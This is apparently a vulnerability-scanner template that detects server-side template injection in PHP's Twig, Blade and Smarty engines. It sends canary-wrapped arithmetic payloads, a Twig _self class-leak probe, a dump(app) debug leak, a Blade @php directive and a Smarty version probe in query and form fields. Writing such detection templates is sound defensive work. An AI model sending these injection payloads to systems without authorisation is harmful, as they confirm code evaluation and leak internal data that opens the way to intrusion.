id: ssti-php-twig-blade-detection

info:
  name: SSTI - PHP Template Engines (Twig / Blade / Smarty)
  author: achraf-chehboun
  severity: critical
  description: |
    Specialized detection for Server-Side Template Injection in PHP frameworks.
    Targets Twig (Symfony default), Blade (Laravel), and Smarty. Uses canary-wrapped
    payloads and engine-specific filter chains to confirm evaluation. Canary approach
    eliminates false positives from pages naturally containing common numbers.
  reference:
    - https://portswigger.net/research/server-side-template-injection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-1336
  metadata:
    max-request: 14
  tags: ssti,twig,blade,smarty,php,symfony,laravel,detection-only

http:
  # === TWIG (Symfony) ===
  # Canary-wrapped arithmetic
  - raw:
      - |
        GET /?name=xnlbz9999999qwfkj HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?name=xnlbz{{267*269}}qwfkj HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    req-condition: true
    matchers:
      - type: dsl
        name: twig-basic-eval
        dsl:
          - '!contains(body_1, "xnlbz71823qwfkj") && contains(body_2, "xnlbz71823qwfkj")'

  # Twig vs Jinja2 differentiator — {{7*'7'}} = 49 in Twig, 7777777 in Jinja2
  - raw:
      - |
        GET /?name=xnlbz{{7*'7'}}qwfkj HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers-condition: or
    matchers:
      - type: word
        name: twig-confirmed-arithmetic
        words:
          - "xnlbz49qwfkj"
        part: body

      - type: word
        name: jinja2-confirmed-string-repeat
        words:
          - "xnlbz7777777qwfkj"
        part: body

  # Twig filter chain confirmation — unique string transformation
  - raw:
      - |
        GET /?name={{'TWIG_SSTI_XNLBZ'|lower}} HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers:
      - type: word
        name: twig-filter-chain
        words:
          - "twig_ssti_xnlbz"
        part: body

  # Twig: _self reference (leaks template metadata)
  - raw:
      - |
        GET /?name={{_self.env.getExtension("Twig\Extension\CoreExtension").getClass().getName()}} HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers:
      - type: regex
        name: twig-class-leak
        regex:
          - '(?i)Twig\\\\(?:Extension|Environment|Template)'
        part: body

  # Twig: dump() function (debug mode leak)
  - raw:
      - |
        GET /?name={{dump(app)}} HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers:
      - type: dsl
        name: twig-dump-leak
        dsl:
          - 'contains(body, "Symfony\\") || contains(body, "kernel.debug") || contains(body, "APP_ENV")'

  # === LARAVEL BLADE ===
  # Blade via POST with canary
  - raw:
      - |
        POST /search HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html

        q=xnlbz9999999qwfkj
      - |
        POST /search HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html

        q=xnlbz{{267*269}}qwfkj

    req-condition: true
    matchers:
      - type: dsl
        name: blade-double-brace-eval
        dsl:
          - '!contains(body_1, "xnlbz71823qwfkj") && contains(body_2, "xnlbz71823qwfkj")'

  # Blade: @php directive
  - raw:
      - |
        POST /search HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html

        q=@php echo 'BLADE_SSTI_XNLBZ'; @endphp

    matchers:
      - type: word
        name: blade-php-directive-eval
        words:
          - "BLADE_SSTI_XNLBZ"
        part: body

  # Blade: {!! unescaped output !!}
  - raw:
      - |
        GET /?name=xnlbz{!!267*269!!}qwfkj HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers:
      - type: word
        name: blade-unescaped-eval
        words:
          - "xnlbz71823qwfkj"
        part: body

  # === SMARTY ===
  # Smarty: canary-wrapped {expr}
  - raw:
      - |
        GET /?name=xnlbz{267*269}qwfkj HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers:
      - type: word
        name: smarty-basic-eval
        words:
          - "xnlbz71823qwfkj"
        part: body

  # Smarty: {if} conditional with unique sentinel
  - raw:
      - |
        GET /?name={if 267*269==71823}SMARTY_SSTI_XNLBZ{/if} HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers:
      - type: word
        name: smarty-conditional-eval
        words:
          - "SMARTY_SSTI_XNLBZ"
        part: body

  # Smarty: version leak
  - raw:
      - |
        GET /?name={$smarty.version} HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers-condition: and
    matchers:
      - type: regex
        name: smarty-version-leak
        regex:
          - '[2-4]\.[0-9]+\.[0-9]+'
        part: body
      - type: dsl
        dsl:
          - '!contains(body, "{$smarty.version}")'

    extractors:
      - type: regex
        name: engine-errors
        group: 0
        regex:
          - '(?i)((?:Twig|Blade|Smarty|Symfony)[\w\\\\. ]*(?:Error|Exception|CompileError)[^<\n]{0,300})'
          - '(?i)(Twig_Error_[A-Za-z]+[^<\n]{0,200})'
